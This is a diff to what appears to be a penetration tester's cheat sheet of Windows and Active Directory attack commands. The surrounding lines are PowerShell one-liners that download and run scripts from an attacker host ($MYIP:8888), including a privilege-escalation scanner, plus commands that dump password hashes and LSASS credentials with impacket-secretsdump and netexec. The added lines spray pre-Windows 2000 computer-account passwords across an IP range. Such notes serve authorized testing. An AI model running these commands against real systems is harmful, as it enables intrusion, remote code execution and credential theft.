@@ -1681,6 +1681,10 @@ IEX (New-Object Net.WebClient).DownloadString('http://$MYIP:8888/whoami')
 +---------- Full Privesc Scan ----------+
 IEX (New-Object Net.WebClient).DownloadString('http://$MYIP:8888/windows/PrivescCheck.ps1');Invoke-PrivescCheck
 
++---------- Pre Windows 2000 ----------+
+cat computers | cut -d '$' -f1 > PRE2k
+nxc smb 192.168.110.51-56 -u computers -p PRE2k --no-bruteforce
+
 +---------- Dump Hashes ----------+
 impacket-secretsdump $DOM/'$USERNAME':'$PASSWORD'@$TARGET
 nxc smb $TARGET -u '$USERNAME' -p '$PASSWORD' -M lsassy
